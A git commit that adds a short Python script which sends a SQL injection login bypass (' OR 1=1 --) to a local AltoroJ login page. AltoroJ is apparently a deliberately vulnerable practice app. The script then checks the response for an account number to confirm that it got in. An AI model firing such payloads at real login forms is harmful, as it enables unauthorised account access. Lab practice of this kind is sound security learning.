f7f7e42348f5b65eeb31fbe019b7bbb00b64414f
Jose Ignacio Lavecchia Suarez <127800259+Joseignlave1@users.noreply.github.com>
2024-10-18 10:53:41 -0300

    Finished script º

---
+++ Main.py
@@ -0,0 +1,18 @@
+import requests
+
+def validateLog(url : str, data: dict[str, str]) -> int:
+    request = requests.post(url, data=data)
+    if(request.text.__contains__("800000")):
+        return 1
+    else:
+        return 0
+
+
+
+url = 'http://localhost:8130/altoroj/doLogin'
+data = {'uid': "' OR 1=1 --", 'passw': "' OR 1=1 --"}
+
+print(validateLog(url, data))
+
+
+
